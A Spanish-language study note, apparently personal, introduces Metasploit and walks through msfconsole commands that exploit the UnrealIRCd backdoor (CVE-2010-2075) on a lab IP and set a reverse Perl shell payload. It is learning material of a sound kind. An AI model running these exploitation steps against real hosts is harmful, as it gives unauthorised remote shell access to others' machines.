## Metasploit

- Exploits hechos en [[Ruby]].
- Herramienta automática, un framework para hacer la explotación de forma sencilla
- Tiene implementados un conjunto de exploits enorme para las vulnerabilidades que van saliendo.
- Entonces metasploit almacena un modulo y nos permite utilizarlo.
- Ademas, tiene herramientas auxiliares que nos permiten realizar toda la fase de lanzamiento del exploit contra un target, Manejo de la conexión que nos puede devolver ese target hacia nosotros.

La instalacion en Windows se puede realizar pero seria muy dificil porque Windows defender se activaria para bloquearlo. 



$ sudo service nessusd start

Luego abrimos el navegador para acceder al reporte de vulnerabilidades

$ sudo msfdb init && msfconsole

msf6 > search cve:2010-2075
msf6 > use 0
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set rhosts 192.168.180.131
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > show options

*Ademas del exploit necesitamos un [[payload]]*

msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > show payloads
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload 7
payload => cmd/unix/reverse_perl


#keywords
RHOSTS -> Remote Hosts. La ip de la maquina a atacar
RPORT -> Remote Port de la maquina que vamos a atacar.
URI -> Unique Resource Identifier 